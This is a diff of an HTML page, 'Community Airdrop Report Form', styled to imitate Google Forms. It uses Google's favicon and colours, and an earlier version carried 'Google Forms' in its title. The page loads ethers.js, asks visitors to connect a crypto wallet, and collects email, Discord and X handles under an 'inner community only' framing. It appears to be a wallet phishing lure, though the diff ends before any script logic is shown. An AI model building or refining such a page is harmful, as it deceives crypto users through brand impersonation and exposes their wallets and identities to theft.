@@ -3,74 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Community Airdrop Report Form - Google Forms</title>
-    
-    <!-- Google Forms Favicon -->
+    <title>Community Airdrop Report Form</title>
     <link rel="icon" href="https://ssl.gstatic.com/docs/forms/favicon_2024.ico" type="image/x-icon">
-
-    <!-- Reliable ethers.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        body { background:#f0edf7; padding:20px; display:flex; justify-content:center; min-height:100vh; }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: Roboto, Arial, sans-serif; }
+        body { background:#f0edf7; padding:20px; min-height:100vh; display:flex; justify-content:center; }
         .container { width:100%; max-width:820px; }
-        .form-header { background:white; border-radius:10px; overflow:hidden; margin-bottom:15px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
-        .top-bar { height:10px; background:#673ab7; }
-        .header-content { padding:28px; }
-        .header-content h1 { font-size:2rem; color:#202124; margin-bottom:10px; }
-        .header-content p { color:#5f6368; line-height:1.5; }
-        .form-card { background:white; border-radius:10px; padding:30px; margin-bottom:15px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
-        .form-card label { display:block; font-size:16px; margin-bottom:10px; color:#202124; }
-        .required { color:#d93025; }
-        input[type="text"], input[type="email"], textarea {
-            width:100%; border:none; border-bottom:2px solid #dadce0; outline:none;
-            padding:12px 0; font-size:16px; transition:border-color 0.3s ease; background:transparent;
+
+        .form-header, .form-card, .submit-area {
+            background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1);
         }
-        input:focus, textarea:focus { border-bottom:2px solid #673ab7; }
-        textarea { resize:vertical; min-height:80px; }
+        .top-bar { height:8px; background:linear-gradient(to right,#4285f4,#34a853,#fbbc05,#ea4335); }
+        .header-content { padding:24px 28px; }
+        .header-content h1 { font-size:28px; color:#202124; margin-bottom:8px; }
+
+        .form-card { padding:28px 32px; margin-bottom:16px; }
+        label { font-size:16px; font-weight:500; color:#202124; display:block; margin-bottom:8px; }
+        .required { color:#d93025; }
+
+        input, textarea {
+            width:100%; border:none; border-bottom:2px solid #dadce0; padding:10px 0; font-size:16px; outline:none;
+        }
+        input:focus, textarea:focus { border-bottom:2px solid #1a73e8; }
 
         .wallet-btn {
-            background:white; color:#131313; border:2px solid #121212; border-radius:6px;
-            padding:12px 28px; cursor:pointer; font-size:16px; font-weight:600;
-            transition:all 0.3s ease; width:25%;
+            width:100%; padding:12px; margin-top:8px; font-size:16px; font-weight:600;
+            background:white; color:#131313; border:2px solid #121212; border-radius:6px; cursor:pointer;
         }
-        .wallet-btn:hover { background:#2e2e2e; color:white; }
-        .wallet-btn.connected { background:#151515 !important; color:white !important; border-color:#1e1e1e !important; }
+        .wallet-btn.connected { background:#1a73e8; color:white; border-color:#1a73e8; }
 
-        .wallet-address {
-            margin-top:15px; color:#202124; font-size:15px; word-break:break-word;
-            padding:12px 16px; background:#f8f9fa; border-radius:6px; border-left:4px solid #34a853;
-            display:none;
-        }
+        .wallet-address { margin-top:15px; padding:12px; background:#f8f9fa; border-radius:6px; display:none; }
         .wallet-address.visible { display:block; }
 
-        .status { margin-top:12px; font-size:14px; color:#5f6368; min-height:24px; }
-        .status.success { color:#34a853; font-weight:500; }
+        .status { margin-top:12px; font-size:14px; min-height:24px; }
 
-        .submit-area { display:flex; justify-content:space-between; align-items:center; background:white; border-radius:10px; padding:20px 30px; box-shadow:0 1px 3px rgba(0,0,0,0.1); }
-        .submit-btn { background:#b2b2b2; color:rgb(67, 67, 67); border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; }
-        .submit-btn:hover { background:#185abc; }
-        .clear-btn { color:#673ab7; text-decoration:none; font-weight:500; }
+        .submit-area { padding:20px 30px; display:flex; justify-content:space-between; align-items:center; }
+        .submit-btn { background:#1a73e8; color:white; border:none; padding:12px 32px; border-radius:4px; cursor:pointer; }
     </style>
 </head>
-
 <body>
 <div class="container">
     <div class="form-header">
         <div class="top-bar"></div>
         <div class="header-content">
             <h1>Community Airdrop Report Form</h1>
-            <p>Form is exclusive to inner community members only. Do not share this link with anyone.</p>
+            <p>Form is exclusive to inner community members only.</p>
         </div>
     </div>
 
     <form id="airdropForm">
         <div class="form-card">
             <label>Connect Wallet <span class="required">*</span></label>
-            <p style="color:#5f6368; font-size:14px; margin:8px 0 16px 0;">
-                Connect your wallet to verify your eligibility.
-            </p>
             <button type="button" id="connectWalletBtn" class="wallet-btn">Connect Wallet</button>
             <div id="walletAddress" class="wallet-address"></div>
             <div id="status" class="status"></div>
@@ -78,22 +63,22 @@
 
         <div class="form-card">
             <label>Email <span class="required">*</span></label>
-            <input type="email" id="email" placeholder="your.email@gmail.com" required>
+            <input type="email" id="email" required>
         </div>
 
         <div class="form-card">
             <label>Discord Username <span class="required">*</span></label>
-            <input type="text" id="discord" placeholder="username#0000" required>
+            <input type="text" id="discord" required>
         </div>
 
         <div class="form-card">
             <label>X (Twitter) Handle <span class="required">*</span></label>
-            <input type="text" id="twitter" placeholder="@yourusername" required>
+            <input type="text" id="twitter" required>
         </div>
 
         <div class="form-card">
             <label>Complaint / Description <span class="required">*</span></label>
-            <textarea id="complaint" placeholder="Write your answer here..." required></textarea>
+            <textarea id="complaint" rows="4" required></textarea>
         </div>
 
         <div class="submit-area">
